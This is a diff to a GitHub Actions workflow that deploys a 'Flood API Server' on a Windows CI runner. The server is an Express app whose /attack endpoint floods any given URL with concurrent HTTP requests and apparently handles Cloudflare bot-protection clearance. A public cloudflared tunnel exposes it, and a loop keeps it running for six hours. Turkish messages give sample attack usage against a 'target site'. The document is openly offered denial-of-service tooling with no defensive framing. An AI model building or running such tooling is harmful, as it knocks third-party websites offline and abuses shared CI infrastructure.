@@ -20,20 +20,18 @@ jobs:
     
     - name: Install Dependencies
       run: |
+        mkdir C:\flood-api
+        cd C:\flood-api
         npm init -y
-        npm install express puppeteer-extra puppeteer-extra-plugin-stealth http2 axios cors
-        npm install -g pm2
+        npm install express puppeteer-extra puppeteer-extra-plugin-stealth cors
     
     - name: Create Server File
       shell: powershell
       run: |
-        New-Item -ItemType Directory -Force -Path "C:\flood-api"
-        
         $serverCode = @'
         const express = require('express');
         const http = require('http');
         const https = require('https');
-        const cluster = require('cluster');
         const os = require('os');
         const crypto = require('crypto');
         const urlModule = require('url');
@@ -148,7 +146,7 @@ jobs:
             }
         }
 
-        function createWorker(targetUrl, powerLevel, workerId) {
+        function createWorker(targetUrl, powerLevel) {
             const parsedUrl = urlModule.parse(targetUrl);
             const isHttps = targetUrl.startsWith('https');
             const hostname = parsedUrl.hostname;
@@ -272,7 +270,7 @@ jobs:
         app.get('/attack', async (req, res) => {
             const url = req.query.url;
             const concurrent = parseInt(req.query.concurrent) || 200;
-            const threads = parseInt(req.query.threads) || os.cpus().length;
+            const threads = parseInt(req.query.threads) || 2;
 
             if (!url) {
                 return res.status(400).json({ 
@@ -286,7 +284,7 @@ jobs:
                 });
             }
 
-            console.log('🚀 Attack started on ' + url + ' with ' + concurrent + ' concurrent, ' + threads + ' threads');
+            console.log('Attack started on ' + url + ' with ' + concurrent + ' concurrent, ' + threads + ' threads');
             
             attackStatus = {
                 running: true,
@@ -307,7 +305,7 @@ jobs:
 
             for (let i = 0; i < threads; i++) {
                 setTimeout(() => {
-                    createWorker(url, concurrent, i);
+                    createWorker(url, concurrent);
                 }, i * 100);
             }
 
@@ -351,7 +349,7 @@ jobs:
             };
             cfClearance = null;
             
-            console.log('⛔ Attack stopped');
+            console.log('Attack stopped');
             res.json({
                 status: 'Attack stopped',
                 message: 'Tum islemler durduruldu'
@@ -373,75 +371,63 @@ jobs:
 
         const PORT = 3000;
         app.listen(PORT, '0.0.0.0', () => {
-            console.log('✅ Flood API Server running on port ' + PORT);
-            console.log('📡 Local: http://localhost:' + PORT);
+            console.log('Flood API Server running on port ' + PORT);
         });
 
         module.exports = app;
-        '@ | Out-File -FilePath "C:\flood-api\server.js" -Encoding UTF8
+        '@
+        
+        $serverCode | Out-File -FilePath "C:\flood-api\server.js" -Encoding UTF8
 
-    - name: Start Server with PM2
+    - name: Start Server
       run: |
         cd C:\flood-api
-        pm2 start server.js --name flood-api
-        pm2 save
-        pm2 list
+        node server.js &
         Start-Sleep -Seconds 5
-        pm2 logs flood-api --lines 20 --nostream
+        echo "Server started on port 3000"
 
-    - name: Download and Install Cloudflared
+    - name: Download Cloudflared
       run: |
         Invoke-WebRequest -Uri "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe" -OutFile "cloudflared.exe"
-        Move-Item -Path ".\cloudflared.exe" -Destination "C:\cloudflared.exe" -Force
     
-    - name: Start Cloudflared Tunnel
+    - name: Start Cloudflared
       run: |
-        Start-Process -FilePath "C:\cloudflared.exe" -ArgumentList "tunnel --url http://localhost:3000" -WindowStyle Hidden -RedirectStandardOutput "C:\cloudflared.log" -RedirectStandardError "C:\cloudflared-error.log"
+        .\cloudflared.exe tunnel --url http://localhost:3000 &
         Start-Sleep -Seconds 10
         
-        $logContent = Get-Content "C:\cloudflared.log" -ErrorAction SilentlyContinue
-        $tunnelUrl = ($logContent | Select-String -Pattern "https://[a-zA-Z0-9-]+\.trycloudflare\.com" | ForEach-Object { $_.Matches.Value }) | Select-Object -First 1
+        # Get tunnel URL
+        $tunnelUrl = (.\cloudflared.exe tunnel --url http://localhost:3000 2>&1 | Select-String -Pattern "https://[a-zA-Z0-9-]+\.trycloudflare\.com" | ForEach-Object { $_ -match 'https://[a-zA-Z0-9-]+\.trycloudflare\.com' > $null; $matches[0] }) | Select-Object -First 1
         
-        Clear-Host
-        Write-Host "============================================" -ForegroundColor Green
-        Write-Host "     🚀 FLOOD API SERVER HAZIR! 🚀" -ForegroundColor Cyan
-        Write-Host "============================================" -ForegroundColor Green
+        Write-Host "============================================"
+        Write-Host "     FLOOD API SERVER HAZIR!"
+        Write-Host "============================================"
         Write-Host ""
         if ($tunnelUrl) {
-            Write-Host "🌐 PUBLIC URL: $tunnelUrl" -ForegroundColor Yellow
+            Write-Host "PUBLIC URL: $tunnelUrl"
             Write-Host ""
-            Write-Host "📡 API ENDPOINTS:" -ForegroundColor Magenta
-            Write-Host "   ${tunnelUrl}/attack?url=https://example.com&concurrent=200" -ForegroundColor White
-            Write-Host "   ${tunnelUrl}/stop" -ForegroundColor White
-            Write-Host "   ${tunnelUrl}/status" -ForegroundColor White
-            Write-Host ""
-            Write-Host "💡 Ornek Kullanim:" -ForegroundColor Green
-            Write-Host "   curl ${tunnelUrl}/attack?url=https://hedefsite.com&concurrent=300" -ForegroundColor Gray
-            Write-Host "   curl ${tunnelUrl}/status" -ForegroundColor Gray
+            Write-Host "API ENDPOINTS:"
+            Write-Host "   ${tunnelUrl}/attack?url=https://example.com&concurrent=200"
+            Write-Host "   ${tunnelUrl}/stop"
+            Write-Host "   ${tunnelUrl}/status"
         } else {
-            Write-Host "⚠️ Cloudflared log okunamadi, manuel kontrol:" -ForegroundColor Red
-            Write-Host "   Get-Content C:\cloudflared.log" -ForegroundColor Gray
+            Write-Host "Cloudflared baslatiliyor... LUTFEN BEKLEYIN"
+            Write-Host "Cloudflare URL'si icin loglari kontrol edin"
         }
         Write-Host ""
-        Write-Host "============================================" -ForegroundColor Green
-        Write-Host "⏱️  Server 6 saat boyunca aktif kalacak" -ForegroundColor Yellow
-        Write-Host "============================================" -ForegroundColor Green
-    
-    - name: Keep Server Alive
+        Write-Host "============================================"
+
+    - name: Keep Alive
       run: |
-        Write-Host "🔄 Server aktif, 6 saat boyunca calisacak..."
-        Write-Host "📊 PM2 status:"
-        pm2 list
-        
+        Write-Host "Server 6 saat boyunca calisacak..."
         $timeout = 21600
         $elapsed = 0
         while ($elapsed -lt $timeout) {
             try {
-                $status = Invoke-RestMethod -Uri "http://localhost:3000/status" -ErrorAction Stop
-                Write-Host "`n📊 Status: Running=$($status.running) | RPS=$($status.rps) | Total=$($status.totalRequests)" -ForegroundColor Green
+                $response = Invoke-RestMethod -Uri "http://localhost:3000/status" -ErrorAction Stop
+                Write-Host "Status: Running=$($response.running) | RPS=$($response.rps) | Total=$($response.totalRequests)"
             } catch {
-                Write-Host "`n⚠️ Status check failed" -ForegroundColor Yellow
+                Write-Host "Status check failed" -ForegroundColor Yellow
             }
-            Start-Sleep -Seconds 10
-            $elapsed += 10
+            Start-Sleep -Seconds 15
+            $elapsed += 15
         }
